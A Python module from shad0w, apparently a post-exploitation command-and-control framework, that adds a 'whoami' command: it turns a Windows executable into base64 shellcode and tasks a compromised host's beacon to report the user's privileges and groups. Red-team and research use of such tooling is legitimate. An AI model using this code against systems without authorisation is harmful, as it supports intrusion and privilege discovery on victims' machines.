# 
# Get information about the current user
#

import json
import base64
import argparse

from lib import shellcode

__description__ = "Show info about the current user"
__author__ = "@_batsec_"
__type__ = "enumeration"

# using work around for stager bug
# EXEC_ID       = 0x4000
# OPCODE_WHOAMI = 0x7000

TMP_EXEC_ID = 0x3000

ERROR = False
error_list = ""


def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"


def exit(status=0, message=None):
    if message != None: print(message)
    return


def whoami_callback(shad0w, data):
    if len(data) > 1:
        print("")
        shad0w.debug.log(data.strip("\r\n"), log=True, pre=False, end='')

    return ""


def get_whoami_args(args):
    data = ""

    if args.all:
        return "/all"
    
    if args.groups:
        data += "/groups"
    
    if args.privs:
        data += "/priv"
    
    return data


async def main(shad0w, args):
    global ERROR

    # save the raw args
    raw_args = args
    
    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.error("ERROR: No active beacon.")
        return

    # usage examples
    usage_examples = """

Examples:

whoami
whoami --all
whoami --privs
whoami --groups
"""
    
    parse = argparse.ArgumentParser(prog='whoami',
                                formatter_class=argparse.RawDescriptionHelpFormatter,
                                epilog=usage_examples)
    
    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # setup the args
    parse.add_argument("-a", "--all", action='store_true', help="Show all available information")
    parse.add_argument("-p", "--privs", action='store_true', help="Show all privileges")
    parse.add_argument("-g", "--groups", action='store_true', help="Show all groups the user is a member of")

    # make sure we don't die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    # the user might have just run 'ls' but if not lets fail
    if (not len(raw_args) == 1) and (not raw_args == "whoami"):
        if ERROR:
            ERROR = False
            print(error_list)
            parse.print_help()
            return
    
    # this will change to args to args for whoami
    data = get_whoami_args(args)

    # work around for the stager bug
    # make the json
    # data = {"op" : OPCODE_WHOAMI, "args": data}
    # print(data)
    # data = json.dumps(data)
    # set a task for the current beacon to do
    # shad0w.beacons[shad0w.current_beacon]["callback"] = whoami_callback
    # shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, data)

    # do we have arguments to pass to the function?
    file = "/root/shad0w/bin/whoami.x64.exe"

    # rcode = buildtools.extract_shellcode(beacon_file=file, want_base64=True)

    if len(data) != 0:
        rcode = base64.b64encode(shellcode.generate(file, None, data, parse=False)).decode()
    elif len(data) == 0:
        rcode = base64.b64encode(shellcode.generate(file, None, None, parse=False)).decode()

    shad0w.beacons[shad0w.current_beacon]["callback"] = whoami_callback
    shad0w.beacons[shad0w.current_beacon]["task"] = (TMP_EXEC_ID, rcode)
